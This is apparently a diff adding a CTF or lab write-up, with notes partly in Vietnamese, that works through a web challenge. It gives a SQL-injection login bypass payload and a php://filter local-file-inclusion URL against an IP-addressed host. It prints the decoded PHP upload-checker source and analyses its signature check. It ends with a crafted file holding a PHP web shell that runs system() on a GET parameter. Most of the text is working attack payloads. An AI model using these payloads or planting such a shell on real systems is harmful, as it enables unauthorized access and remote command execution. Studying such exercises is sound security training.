@@ -1,0 +1,93 @@
+An error occurred: PG::SyntaxError: ERROR: unterminated quoted string at or near "'test'' limit 1" LINE 1: ...ers where user = 'quac'' and password = 'test''... ^ : select * from users where user = 'quac'' and password = 'test'' limit 1.);
+-> posgresql
+
+Query: select * from users where user = 'quac' and password = 'test' limit 1
+select * from users where user = 'quac' or 1=1 limit 1.); -- - ' and password = 'a' limit 1.);
+quac' or 1=1 limit 1.); -- - 
+a
+
+http://45.77.45.157/?page=checkFile
+http://45.77.45.157/?page=php://filter/convert.base64-encode/resource=checkFile
+-> PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxib2R5Pg0KDQo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4NCiAgU2VsZWN0IGZpbGUgdG8gY2hlY2s6DQogIDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlcyIgaWQ9ImZpbGVUb1VwbG9hZCI+DQogIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJDaGVjayIgbmFtZT0ic3VibWl0Ij4NCjwvZm9ybT4NCg0KPC9ib2R5Pg0KPC9odG1sPg0KDQo8P3BocA0KCQ0KCWZ1bmN0aW9uIGNoZWNrU2lnbigkaGFuZGxlcil7DQoJCSRoZWFkZXIgPSBmcmVhZCgkaGFuZGxlciwgMTIpOw0KCQkkdHlwZSA9IHN1YnN0cigkaGVhZGVyLCAwLCA0KTsNCgkJJHNpemUgPSB1bnBhY2soIm4iLHN1YnN0cigkaGVhZGVyLCA0LCA0KSk7DQoJCSRzaWduZXIgPSBzdWJzdHIoJGhlYWRlciwgOCwgNCk7IA0KCQkNCgkJaWYoJHR5cGUhPT0iRklMRSIgfHwgJHNpZ25lciE9PSJDTFdOIil7DQoJCQlyZXR1cm4gRmFsc2U7DQoJCX1lbHNlew0KCQkJcmV0dXJuICRzaXplOw0KCQl9DQoNCgl9DQoNCglmdW5jdGlvbiBjaGVja0ZpbGUoJGZpbGUsJHN0YXJ0LCRzaXplKXsNCgkJLy8gd2Ugc3RpbGwgdHJ5aW5nIHRvIGNvbGxlY3QgbW9yZSAuLi4gdG8gZGVwbG95IHRoaXMgDQoJfQ0KDQoNCgkNCg0KCWlmKGlzc2V0KCRfRklMRVMpICYmICFlbXB0eSgkX0ZJTEVTKSApew0KCQkvL3VwbG9hZA0KCQkkZmlsZU5hbWUgPSBoYXNoKCJzaGEyNTYiLCRfRklMRVNbImZpbGVzIl1bIm5hbWUiXSk7DQoJCSR1cGxvYWRwYXRoID0gInRtcC8iOw0KCQkkZXh0ID0gcGF0aGluZm8oJF9GSUxFU1siZmlsZXMiXVsibmFtZSJdLCBQQVRISU5GT19FWFRFTlNJT04pOw0KCQkkdXBsb2FkX2RpciA9ICR1cGxvYWRwYXRoLiRmaWxlTmFtZS4iLiIuJGV4dDsgIA0KCQkNCg0KCQkvL2NoZWNrDQoJCSRmID0gZm9wZW4oJF9GSUxFU1siZmlsZXMiXVsidG1wX25hbWUiXSwicmIiKTsNCgkJJGZpbGVTaXplID0gY2hlY2tTaWduKCRmKTsNCgkJZmNsb3NlKCRmKTsNCgkJaWYoJGZpbGVTaXplWzBdID09PSAwKXsNCgkJCSRlcnJvciA9ICJFbXB0eSBmaWxlIG5vdGhpbmcgdG8gZG8iOw0KCQl9ZWxzZWlmKCRmaWxlU2l6ZVswXSA+IDEwMjQpew0KCQkJJGVycm9yID0gIkZpbGUgdG9vIGxhcmdlIjsNCgkJfWVsc2VpZighJGZpbGVTaXplKXsNCgkJCSRlcnJvciA9ICJDb250YWN0IGFkbWluIHRvIHNpZ24geW91ciBmaWxlIGJlZm9yZSBjaGVjayBidHcgaGUgZ290IHNvbWV0aGluZyBjYWxsIEZMQUcgIjsNCgkJfWVsc2V7DQoJCQltb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1siZmlsZXMiXVsidG1wX25hbWUiXSwgJHVwbG9hZF9kaXIpOw0KCQkJY2hlY2tGaWxlKCR1cGxvYWRfZGlyLDEyLCRmaWxlU2l6ZSk7DQoJCQl1bmxpbmsoJHVwbG9hZF9kaXIpOw0KCQl9DQoJCWVjaG8gJGVycm9yOw0KCX0NCgkvLw0KCQ0KPz4NCg==
+
+<!DOCTYPE html>
+<html>
+<body>
+
+<form action="" method="post" enctype="multipart/form-data">
+  Select file to check:
+  <input type="file" name="files" id="fileToUpload">
+  <input type="submit" value="Check" name="submit">
+</form>
+
+</body>
+</html>
+
+<?php
+	
+	function checkSign($handler){
+		$header = fread($handler, 12); //dọc 12 kí tự đầu của file
+		$type = substr($header, 0, 4); // type = 4 kí tự đầu
+		$size = unpack("n",substr($header, 4, 4)); //
+		$signer = substr($header, 8, 4); //singer là 4 kí tự cuối của 12 chữ đầu
+		
+		if($type!=="FILE" || $signer!=="CLWN"){
+			return False;
+		}else{
+			return $size;
+		}
+
+	}
+
+	function checkFile($file,$start,$size){
+		// we still trying to collect more ... to deploy this 
+	}
+
+
+	
+
+	if(isset($_FILES) && !empty($_FILES) ){
+		//upload
+		$fileName = hash("sha256",$_FILES["files"]["name"]);
+		$uploadpath = "tmp/";
+		$ext = pathinfo($_FILES["files"]["name"], PATHINFO_EXTENSION);
+		$upload_dir = $uploadpath.$fileName.".".$ext;  
+		
+
+		//check
+		$f = fopen($_FILES["files"]["tmp_name"],"rb");
+		$fileSize = checkSign($f);
+		fclose($f);
+		if($fileSize[0] === 0){
+			$error = "Empty file nothing to do";
+		}elseif($fileSize[0] > 1024){
+			$error = "File too large";
+		}elseif(!$fileSize){
+			$error = "Contact admin to sign your file before check btw he got something call FLAG ";
+		}else{
+			move_uploaded_file($_FILES["files"]["tmp_name"], $upload_dir);
+			checkFile($upload_dir,12,$fileSize);
+			unlink($upload_dir);
+		}
+		echo $error;
+	}
+	//
+	
+?>
+
+
+	$header = fread($handler, 12); //dọc 12 kí tự đầu của file
+	$type = substr($header, 0, 4); // type = 4 kí tự đầu
+	$size = unpack("n",substr($header, 4, 4));
+The unpack() function unpacks data from a binary string.
+n - unsigned short (always 16 bit, big endian byte order)
+-> 4 ki tu nay reture < 1024 khi đi qua unpack("n",substr($header, 4, 4));
+
+	$signer = substr($header, 8, 4); //singer là 4 kí tự cuối của 12 chữ đầu
+-> cần custom 1 file có $signer === "CLWN"
+
+custom.php
+.phpxxxxCLWN<?php system($_GET['cmd']);?>
+
+
+
